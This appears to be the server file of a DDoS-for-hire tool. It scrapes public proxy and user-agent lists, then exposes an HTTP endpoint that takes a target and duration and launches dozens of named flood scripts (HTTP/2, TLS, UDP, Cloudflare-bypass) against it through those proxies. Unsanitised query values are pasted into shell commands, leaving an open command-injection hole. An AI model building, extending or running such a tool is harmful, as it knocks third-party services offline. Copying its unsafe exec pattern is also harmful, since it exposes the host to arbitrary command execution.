const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://spys.me/proxy.txt", 
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
  "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://api.openproxylist.xyz/socks4.txt",
  "https://api.openproxylist.xyz/socks5.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
  "https://spys.me/proxy.txt"
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`Gagal ambil dari ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("Semua proxy berhasil disimpan ke proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy : http://${data.origin}:${port}`);
  return data;
}

app.get('/exc', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly, By Kinzxxoffc Team',
    target,
    time,
    methods
  });

  
  if (methods === 'Kill') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 50 proxy.txt`);
   } else if (methods === 'Phoenix') {
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/MIXMAX.js ${target} ${time} 100 50 proxy.txt`);
    } else if (methods === 'Exercist') {
    exec(`node ./methods/TLS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 50 proxy.txt`);
    } else if (methods === 'Blaze') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 50 proxy.txt`);
   } else if (methods === 'Ultimate') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTP-RAW.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 50 proxy.txt`);

   } else if (methods === 'GloryX') {
    exec(`node ./methods/black.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/bypass.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/bypass2.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/cibi.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/crot.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/destroy.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/glory.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/h2.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/http-raw.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/http-x.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/https.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/httpx.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/mix.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/ninja.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/quantum.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/raw.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/strom.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/strike-war.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/strike.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/thunder.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/TICIPI.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/tls.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/tlsv2.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/cf.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/xyn.js ${target} ${time} 100 50 proxy.txt`);
    } else if (methods === 'GloryX2') {
    exec(`node ./methods/anus-h2.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/black.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/boom.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/bypass.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/cloudflare.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/destroy.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/flood.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/geckold.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/ghostxflood.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/glory.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/http-x.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/inferno.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/kill.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/killer.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/lezkill.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/medusa.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/mix.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/mixsyn.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/night.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/pluto.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/rape.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/raw.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/skynet-tls.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/storm.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/strike.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/thunder.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/tls.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/tls-bypass.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/tls-vip.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/tlsv1.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/tornado.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/uam.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/udp.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/vxx.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/xlamper.js ${target} ${time} 100 50 proxy.txt`);
exec(`node ./methods/xlamper-bom.js ${target} ${time} 100 50 proxy.txt`);
   } else if (methods === 'GloryX3') {
    exec(`node ./methods/novaria.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/CBROWSER.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/H2CA.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/H2GEC.js ${target} ${time} 100 10 3 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/FLUTRA.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/CFbypass.js ${target} ${time}`);
    exec(`node ./methods/bypassv1 ${target} proxy.txt ${time} 100 10`);
    exec(`node ./methods/hyper.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/TLS-LOST.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/TLS-BYPASS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/tls.vip ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 50 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 50 proxy.txt`);

   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
});
